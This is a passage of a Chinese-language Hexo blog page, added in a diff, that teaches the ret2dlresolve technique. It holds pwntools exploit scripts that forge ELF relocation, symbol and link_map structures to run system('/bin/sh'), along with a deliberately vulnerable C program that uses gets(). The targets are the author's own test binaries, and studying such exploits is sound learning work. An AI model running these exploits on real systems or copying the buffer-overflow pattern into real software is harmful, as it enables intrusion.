class="number">0x00000000004012a3</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn_resolve&#x27;</span>)</span><br><span class="line">sym=p32(<span class="number">0x4040b9</span>-<span class="number">0x4004a0</span>)+p64(<span class="number">12</span>)+p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">rel=p64(<span class="number">0x404018</span>)+p32(<span class="number">7</span>)+p64((<span class="number">0x404088</span>-<span class="number">0x4003e0</span>)//<span class="number">0x18</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&quot;/bin/sh\x00&quot;</span>+sym+rel+<span class="string">&quot;\x00system\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x50</span>)+p64(<span class="number">0x4033c0</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(rdi)+p64(<span class="number">0x404080</span>)+p64(<span class="number">0x401020</span>)+p64((<span class="number">0x4040a0</span>-<span class="number">0x4005a8</span>)//<span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h2><blockquote>
+<p>这种方法需要先获取描述当前程序的<code>link_map</code>结构体的<code>scope</code>成员中储存的数据<br>想要获取<code>scope</code>成员中的数据，至少需要达到任意地址读取，这种情况下已经可以泄露libc的地址<br>而想要利用<code>ret2resolve</code>则需要控制程序流程<br>这种情况下，已知<code>libc</code>地址，且可以控制程序，直接执行<code>system(&quot;/bin/sh&quot;);</code>就可以了<br>想要利用<code>link_map</code>还需要 至少<code>0x400</code>的空间，<br>这种情况下，想要伪造<code>link_map</code>,达到<code>ret2dlresolve</code>的目的，利用难度较高<br>但也可能是因为我太菜了，还不会利用</p>
+</blockquote>
+<blockquote>
+<p>以下是我尝试伪造<code>link_map</code>的代码,比较极端地允许输入任意长度的数据</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> a[<span class="number">4096</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">0x20</span>]=&#123;&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\naddr: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,(<span class="type">int</span>)a);</span><br><span class="line">    gets(b);</span><br><span class="line">    gets(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -fno-stack-protector -no-pie 1.c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;bp 0x401201&#x27;</span>)</span><br><span class="line">p.readuntil(<span class="string">&#x27;addr: &#x27;</span>)</span><br><span class="line">d=<span class="built_in">int</span>(p.readline(),<span class="number">16</span>)</span><br><span class="line">fake_dyn=d+<span class="number">0x300</span></span><br><span class="line">fake_map=p64(<span class="number">0</span>)+p64(d)+p64(fake_dyn)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(d)+p64(<span class="number">0</span>)+p64(d)</span><br><span class="line">fake_info=p64(<span class="number">0</span>)+p64(fake_dyn)+p64(<span class="number">0x403f00</span>)+p64(fake_dyn+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(fake_dyn+<span class="number">0x20</span>)+p64(fake_dyn+<span class="number">0x30</span>)+p64(fake_dyn+<span class="number">0x40</span>)+p64(<span class="number">0x403f40</span>)+\</span><br><span class="line">        p64(<span class="number">0x403f50</span>)+p64(<span class="number">0x403ec0</span>)+p64(<span class="number">0x403ed0</span>)+p64(<span class="number">0x403e30</span>)+p64(<span class="number">0x403e40</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x403f10</span>)+p64(<span class="number">0x403ee0</span>)+p64(<span class="number">0</span>)+p64(fake_dyn+<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x403e50</span>)+\</span><br><span class="line">        p64(<span class="number">0x403e70</span>)+p64(<span class="number">0x403e60</span>)+p64(<span class="number">0x403e80</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x403f70</span>)+p64(<span class="number">0x403f60</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0</span>)*<span class="number">25</span>+p64(<span class="number">0x403e90</span>)</span><br><span class="line">seg=d+<span class="number">0x500</span></span><br><span class="line">got=seg</span><br><span class="line">strtab=seg+<span class="number">0x100</span></span><br><span class="line">symtab=seg+<span class="number">0x200</span></span><br><span class="line">reltab=seg+<span class="number">0x300</span></span><br><span class="line">jmprel=seg+<span class="number">0x400</span></span><br><span class="line">fake_map=fake_map+fake_info</span><br><span class="line">fake_map=fake_map.ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_map)))</span><br><span class="line">dyn_sym=p64(<span class="number">1</span>)+p64(<span class="number">24</span>)+p64(<span class="number">3</span>)+p64(got)+p64(<span class="number">5</span>)+p64(strtab)+p64(<span class="number">6</span>)+p64(symtab)+p64(<span class="number">7</span>)+p64(reltab)+p64(<span class="number">0x17</span>)+p64(jmprel)</span><br><span class="line">dyn_sym=dyn_sym.ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_map=fake_map+dyn_sym</span><br><span class="line">nnn=<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">fake_map=fake_map+p64(nnn)</span><br><span class="line"><span class="comment">#因为只是测试，所以直接用gdb获取scope的值，然后输入就可以了</span></span><br><span class="line">fake_map=fake_map.ljust(<span class="number">0x500</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_d=p64(<span class="number">0x405068</span>)</span><br><span class="line">got_d=got_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strtab_d=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&quot;system\x00&quot;</span></span><br><span class="line">strtab_d=strtab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">symtab_d=p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">1</span>)+p64(<span class="number">0x12</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">symtab_d=symtab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">reltab_d=p64(<span class="number">0</span>)</span><br><span class="line">reltab_d=reltab_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmprel_d=p64(got)+p32(<span class="number">7</span>)+p64(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">jmprel_d=jmprel_d.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_map=fake_map + got_d + strtab_d + symtab_d + reltab_d + jmprel_d</span><br><span class="line">bin_sh=<span class="built_in">len</span>(fake_map)+<span class="number">0x40</span></span><br><span class="line">fake_map=fake_map.ljust(bin_sh,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_map=fake_map+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x0000000000401273</span>)+p64(d+bin_sh)+p64(<span class="number">0x401026</span>)+p64(d)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(fake_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/rot-will">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        
+        
+        <li>
+            <a target="_blank"  href="tencent://message/?Site=admin5.com&menu=yes&uin=2127361651">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-qq-fill"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://www.lewiserii.top">lewiserii</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://giscus.app/client.js"
+  data-repo="rot-will/rot-will.github.io"
+  data-repo-id="R_kgDOHgxmbg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOHgxmbs4CPuLX"
+  data-mapping="url"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="light"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async>
+</script>
+
+
+
+
+</html>
